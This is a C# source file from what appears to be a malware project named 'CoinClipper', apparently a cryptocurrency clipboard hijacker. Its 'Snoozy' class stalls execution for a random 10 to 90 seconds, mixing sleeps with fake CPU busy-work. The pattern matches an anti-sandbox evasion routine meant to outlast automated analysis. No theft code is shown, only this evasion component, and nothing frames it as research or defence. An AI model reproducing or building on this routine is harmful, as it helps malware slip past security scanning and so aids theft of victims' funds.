using System;
using System.Diagnostics;
using System.Threading;

namespace CoinClipper
{
    internal static class Snoozy
    {
   
        private static readonly Random rnd = new Random();

    
        public static void SleepRandomly()
        {
     
            int delay = rnd.Next(10000, 90000);

         
            int method = rnd.Next(0, 4);
            switch (method)
            {
                case 0:
               
                    Thread.Sleep(delay);
                    break;
                case 1:
                 
                    SimulateCpuWork(delay);
                    break;
                case 2:
                   
                    ProgressiveSleep(delay);
                    break;
                case 3:
                    
                    MixedDelay(delay);
                    break;
                default:
                    Thread.Sleep(delay);
                    break;
            }
        }


        private static void ProgressiveSleep(int totalDelay)
        {
            int elapsed = 0;

            while (elapsed < totalDelay)
            {
              
                int chunk = rnd.Next(1000, 5000);

             
                if (rnd.NextDouble() < 0.3)
                {
                    SimulateCpuWork(chunk / 2);
                }

                Thread.Sleep(chunk);
                elapsed += chunk;
            }
        }

      
        private static void SimulateCpuWork(int duration)
        {
            Stopwatch sw = new Stopwatch();
            sw.Start();

            while (sw.ElapsedMilliseconds < duration)
            {
            
                double randomValue = rnd.Next(1, 100000);
                if (rnd.NextDouble() < 0.5)
                {
                    double result = Math.Sqrt(randomValue);
                }
                else
                {
                    double result = Math.Log(randomValue);
                }
            }

            sw.Stop();
        }

  
        private static void MixedDelay(int totalDelay)
        {
            int elapsed = 0;

            while (elapsed < totalDelay)
            {
              
                int chunk = rnd.Next(500, 3000);

                if (rnd.NextDouble() < 0.5)
                {
                 
                    Thread.Sleep(chunk);
                }
                else
                {
                 
                    SimulateCpuWork(chunk);
                }

                elapsed += chunk;
            }
        }
    }
}
